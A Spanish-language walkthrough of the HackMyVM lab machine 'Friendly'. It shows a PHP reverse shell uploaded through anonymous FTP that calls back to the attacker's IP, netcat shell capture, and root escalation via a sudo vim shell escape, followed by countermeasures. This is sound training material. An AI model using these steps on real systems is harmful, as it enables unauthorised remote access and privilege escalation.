# Máquina Friendly - HackMyVM

**Plataforma:** [Máquina Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)  
**Dificultad:** Fácil  
**SO:** Linux (Debian)  
**Autor del reto:** RiJaba1  
**Técnicas:** FTP Anonymous, Subida de Web Shell (PHP), Reverse Shell, Escalada de privilegios (Abuso de sudo con Vim)

---

## Índice

1. [Descubrimiento de red](#1-descubrimiento-de-red)
2. [Escaneo de Puertos y Servicios](#2-escaneo-de-puertos-y-servicios)
3. [Enumeración Web](#3-enumeración-web)
4. [Acceso y Explotación vía FTP](#4-acceso-y-explotación-vía-ftp)
5. [Obtención de Acceso Inicial (Shell)](#5-obtención-de-acceso-inicial-shell)
6. [Tratamiento de la TTY](#6-tratamiento-de-la-tty)
7. [Flag de Usuario](#7-flag-de-usuario)
8. [Escalada de Privilegios](#8-escalada-de-privilegios)
9. [Flag de Root](#9-flag-de-root)
10. [Resumen de vulnerabilidades](#10-resumen-de-vulnerabilidades)
11. [Contramedidas recomendadas](#11-contramedidas-recomendadas)
12. [Herramientas utilizadas](#herramientas-utilizadas)

---

Esta documentación detalla el proceso paso a paso para comprometer la máquina **Friendly** de la plataforma HackMyVM. El proceso abarca desde el descubrimiento en la red local hasta la escalada de privilegios a `root`.

## 1. Descubrimiento de red

El primer paso antes de atacar una máquina es identificar su dirección IP dentro de nuestra red local. Para ello, utilizamos `arp-scan`, que envía paquetes ARP para descubrir los dispositivos conectados a nuestra misma subred.

```bash
┌──(root㉿kali)-[~]
└─# arp-scan -I eth0 192.168.100.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:8a:35:d2, IPv4: 192.168.100.250
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   52:54:00:12:35:00       QEMU
192.168.100.2   52:54:00:12:35:00       QEMU
192.168.100.3   08:00:27:d8:4c:35       PCS Systemtechnik GmbH
192.168.100.7   08:00:27:a2:9f:c0       PCS Systemtechnik GmbH

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.200 seconds (116.36 hosts/sec). 4 responded
```

| Parámetro | Descripción |
|-----------|-------------|
| `-I eth0` | Interfaz de red a utilizar para el escaneo |

> La IP **192.168.100.7** corresponde a la máquina objetivo Friendly.

---

## 2. Escaneo de Puertos y Servicios

Una vez obtenida la IP, realizamos un escaneo exhaustivo con `nmap` para descubrir qué puertos están abiertos, qué servicios corren en ellos y sus versiones.

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.100.7
...
PORT   STATE SERVICE REASON       VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.54 ((Debian))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)
...
```

| Parámetro | Descripción |
|-----------|-------------|
| `-p-` | Escanea todos los puertos del 1 al 65535 |
| `-sS` | TCP SYN scan (stealth): no completa el handshake |
| `-sC` | Ejecuta scripts NSE por defecto |
| `-sV` | Detección de versión del servicio |
| `--min-rate` | Mínimo de paquetes por segundo |
| `-vvv` | Verbosidad máxima |
| `-n` | No resuelve nombres DNS |
| `-Pn` | Omite el ping previo (asume host activo) |

> El servicio FTP en el puerto 21 permite autenticación anónima, y hay un Apache 2.4.54 en el puerto 80.

La presencia del archivo `index.html` en el FTP nos da una pista crucial: **es muy probable que el directorio raíz del FTP sea el mismo que el directorio raíz del servidor web** (`/var/www/html`).

---

## 3. Enumeración Web

Para descartar directorios ocultos o paneles de administración en el servidor web, lanzamos un ataque de fuerza bruta de directorios utilizando `gobuster`.

```bash
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.100.7 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 9631 / 207642 (4.64%)
...
```

| Parámetro | Descripción |
|-----------|-------------|
| `dir` | Modo enumeración de directorios |
| `-u` | URL objetivo |
| `-w` | Wordlist a utilizar |

> No encontramos directorios relevantes, por lo que volvemos a nuestro vector de ataque principal: el puerto FTP.

---

## 4. Acceso y Explotación vía FTP

Como vimos en el escaneo con *nmap*, podemos entrar al servicio FTP utilizando el usuario `anonymous` sin necesidad de contraseña (se suele dejar en blanco o poner cualquier cosa).

```bash
┌──(root㉿kali)-[~]
└─# ftp 192.168.100.7
Connected to 192.168.100.7.
220 ProFTPD Server (friendly) [::ffff:192.168.100.7]
Name (192.168.100.7:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering Extended Passive Mode (|||44947|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
```

Nuestra hipótesis era correcta: estamos viendo el archivo del servidor web. Por tanto, podemos subir un archivo malicioso (una *Reverse Shell* en PHP), alojarlo en el servidor, y luego ejecutarlo visitándolo desde el navegador web.

Preparamos el archivo `pentest_monkey.php` configurando nuestra IP de atacante (`192.168.100.250`) y el puerto donde estaremos a la escucha (`1331`).

```bash
┌──(root㉿kali)-[~]
└─# cat pentest_monkey.php 

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.100.250';
$port = 1331;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

/* ... (código de conexión PHP truncado por brevedad) ... */
?>
```

Desde nuestra sesión activa en el FTP, subimos el archivo con el comando `put`.

```bash
ftp> put pentest_monkey.php 
└─#
│local: pentest_monkey.php remote: pentest_monkey.php
│229 Entering Extended Passive Mode (|||46641|)               
│150 Opening BINARY mode data connection for pentest_monkey.ph
│p
│100% |****************|  2596        6.70 MiB/s    00:00 ETA
│226 Transfer complete
│2596 bytes sent in 00:00 (1.14 MiB/s)

│ftp> 
```

---

## 5. Obtención de Acceso Inicial (Shell)

Con el payload ya en el servidor, abrimos un oyente con `netcat` en nuestra máquina atacante por el puerto especificado.

```bash
┌──(root㉿kali)-[~]
└─# nc -lvnp 1331
listening on [any] 1331 ...
```

A continuación, navegamos desde el navegador (o con `curl`) a la URL `http://192.168.100.7/pentest_monkey.php`. El servidor interpreta el código PHP y nos envía la conexión de vuelta.

```bash
connect to [192.168.100.250] from (UNKNOWN) [192.168.100.7] 50272
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 11:16:09 up 50 min,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (450): Inappropriate ioctl for device
bash: no job control in this shell
www-data@friendly:/$ 
```

> **¡Máquina comprometida!** Tenemos acceso inicial como el usuario `www-data` (el servicio web).

---

## 6. Tratamiento de la TTY

La shell que obtenemos inicialmente es muy inestable (un `Ctrl+C` nos sacaría de la máquina). Debemos convertirla en una consola interactiva (TTY completa) para trabajar cómodamente.

```bash
www-data@friendly:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@friendly:/$ ^Z
zsh: suspended  nc -lvnp 1331

┌──(root㉿kali)-[~]
└─# stty -a
speed 9600 baud; rows 54; columns 86; line = 0;
...

┌──(root㉿kali)-[~]
└─# stty raw -echo;fg
[1]  + continued  nc -lvnp 1331
                               export TERM=xterm
www-data@friendly:/$ export SHELL=/bin/bash
www-data@friendly:/$ stty rows 54 columns 86
```

Con estos comandos logramos emular una terminal robusta, con autocompletado y soporte para atajos de teclado.

---

## 7. Flag de Usuario

Exploramos el sistema empezando por el directorio `/home` para identificar los usuarios legítimos de la máquina. Encontramos el directorio de `RiJaba1` y en su interior la primera flag.

```bash
www-data@friendly:/$ ls /home
RiJaba1
www-data@friendly:/$ cd /home/RiJaba1/
www-data@friendly:/home/RiJaba1$ ls -l
total 16
drwxr-xr-x 2 RiJaba1 RiJaba1 4096 Mar 11  2023 CTF
drwxr-xr-x 2 RiJaba1 RiJaba1 4096 Mar 11  2023 Private
drwxr-xr-x 2 RiJaba1 RiJaba1 4096 Feb 21  2023 YouTube
-r--r--r-- 1 RiJaba1 RiJaba1   33 Mar 11  2023 user.txt
www-data@friendly:/home/RiJaba1$ cat user.txt
...
```

> **¡Flag de usuario obtenida!**

---

## 8. Escalada de Privilegios

El siguiente paso es convertirnos en el usuario administrador (`root`). Comenzamos enumerando nuestros permisos de `sudo` para verificar si podemos ejecutar algún comando con altos privilegios sin requerir contraseña.

```bash
www-data@friendly:/home/RiJaba1$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

**Vector de escalada:** El sistema nos permite ejecutar el editor de texto `vim` como root (`ALL : ALL`) sin pedir contraseña (`NOPASSWD`).

Sabiendo que `vim` tiene una funcionalidad incorporada para lanzar subprocesos o interactuar con el sistema operativo (Shell Escape), podemos abusar de esto para generar una shell como el usuario que abrió el archivo (en este caso, `root`).

```bash
www-data@friendly:/home/RiJaba1$ sudo vim escape_de_shell.sh
```

Dentro del editor, pasamos al modo de comandos (`:`) y forzamos a vim a usar `/bin/bash` como intérprete de comandos, para luego invocarlo:

```bash
: set shell=/bin/bash
: shell
```

Automáticamente, Vim nos abre una nueva sesión de terminal con los permisos heredados completando la escalada de privilegios.

```bash
root@friendly:/home/RiJaba1# 
```

> **¡Escalada completada!** Somos `root`.

---

## 9. Flag de Root

Finalmente, nos dirigimos al directorio raíz (`/root`) para leer la última bandera, pero nos encontramos con un engaño.

```bash
root@friendly:/home/RiJaba1# cd
root@friendly:~# ls
interfaces.sh  root.txt
root@friendly:~# cat root.txt
Not yet! Find root.txt.
```

El autor de la máquina ha escondido la bandera real. Utilizamos el comando `find` para buscar todos los archivos llamados `root.txt` en todo el sistema y completar la máquina.

```bash
root@friendly:~# find / -name root.txt
/var/log/apache2/root.txt
/root/root.txt
root@friendly:~# cat /var/log/apache2/root.txt
...
```

> **¡Flag de root obtenida!**

---

## 10. Resumen de vulnerabilidades

| # | Vulnerabilidad | CVE | Criticidad | Impacto |
|---|---------------|-----|------------|---------|
| 1 | FTP Anonymous Login | — | Media | Permite a cualquier usuario acceder al sistema FTP sin credenciales. |
| 2 | Inseguridad en el directorio web (FTP coincide con HTTP) | — | Crítica | Permite subir archivos maliciosos al directorio web y ejecutarlos remotamente (RCE). |
| 3 | Escalada de privilegios vía Sudo con Vim | — | Alta | Permite a `www-data` ejecutar comandos de shell como `root` abusando de `NOPASSWD`. |

---

## 11. Contramedidas recomendadas

1. **FTP Anonymous Login**: Deshabilitar la opción de acceso anónimo en la configuración de `ProFTPD` y requerir autenticación para acceder al servidor.
2. **Inseguridad en el directorio web**: Restringir los permisos de escritura del FTP sobre el directorio raíz del servidor web (`/var/www/html`). Si es necesario habilitar subida de archivos, deben ir a una carpeta externa sin permisos de ejecución para configuraciones de Apache o reglas que eviten la interpretación de scripts en PHP.
3. **Escalada de privilegios vía Sudo**: Eliminar la regla que permite a `www-data` ejecutar `/usr/bin/vim` como `root` sin contraseña en el archivo `sudoers`. Limitar y controlar rigurosamente las aplicaciones interactivas en `sudo`.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `arp-scan` | Descubrimiento de hosts en la red local |
| `nmap` | Escaneo de puertos, detección de servicios y SO |
| `gobuster` | Fuzzing de directorios web |
| `ftp` | Conexión e interacción con servidor FTP |
| `cat` | Lectura de archivos y payloads |
| `netcat (nc)` | Listener para Reverse Shell |
| `curl` / Navegador | Interacción web para ejecutar payload |
| `stty` / `script` | Tratamiento y estabilización de la TTY inestable |
| `sudo` | Obtención de permisos privilegiados |
| `vim` | Editor abusado para la escalada de privilegios |
| `find` | Enumeración y búsqueda de archivos dentro de todo el sistema |